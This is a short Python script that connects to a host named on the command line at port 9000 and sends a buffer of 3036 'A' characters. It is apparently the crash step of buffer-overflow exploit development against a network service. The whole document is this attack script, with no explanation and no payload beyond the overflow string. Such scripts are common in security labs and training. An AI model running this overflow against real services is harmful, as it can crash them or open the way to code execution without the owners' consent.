#!/usr/bin/python

import socket, sys
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((sys.argv[1], 9000))

buffer = "A" * 3036

sock.send(buffer)
sock.close()
